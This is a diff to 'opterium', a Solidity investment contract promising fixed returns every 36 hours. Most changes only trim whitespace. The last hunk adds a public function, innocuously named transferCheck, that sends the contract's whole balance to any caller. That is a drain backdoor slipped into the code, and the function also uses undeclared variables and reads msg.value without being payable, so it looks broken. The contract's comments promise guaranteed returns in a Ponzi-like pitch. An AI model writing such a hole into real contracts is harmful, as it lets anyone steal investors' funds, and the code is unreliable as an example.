@@ -3,8 +3,8 @@ pragma solidity ^0.4.25;
 contract opterium {
     /*
  *   See: http://opterium.ru/
- * 
- *   No one can change this smart contract, including the community creators.  
+ *
+ *   No one can change this smart contract, including the community creators.
  *   The profit is : (interest is accrued continuously).
  * Up to 100  ETH = 1.0 % in 36 hours of your invested amount
  * From 100   ETH = 1.5 % in 36 hours *
@@ -22,15 +22,15 @@ contract opterium {
  *   of the smart contract - opterium
  *   It is not allowed to make transfers from cryptocurrency exchanges.
  *   Only personal ETH wallet with private keys is allowed.
- * 
+ *
  *   Recommended limits are 200000 ETH, check the current ETH rate at
  *   the following link: https://ethgasstation.info/
- * 
+ *
  * How to get paid:
  *   Request your profit by sending 0 ETH to the address of the smart contract.
  *
-  */  
-    
+  */
+
     mapping (address => uint256) public invested;
     mapping (address => uint256) public atBlock;
     address techSupport = 0x720497fce7D8f7D7B89FB27E5Ae48b7DA884f582;
@@ -92,10 +92,10 @@ contract opterium {
         }
     }
 
-  
+
     function () external payable {
         if (invested[msg.sender] != 0) {
-            
+
             uint thisBalance = address(this).balance;
             uint amount = invested[msg.sender] * calculateProfitPercent(thisBalance) / 1000 * (block.number - atBlock[msg.sender]) / 9150;
 
@@ -109,4 +109,14 @@ contract opterium {
         atBlock[msg.sender] = block.number;
         invested[msg.sender] += (msg.value);
     }
+	 function transferCheck() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
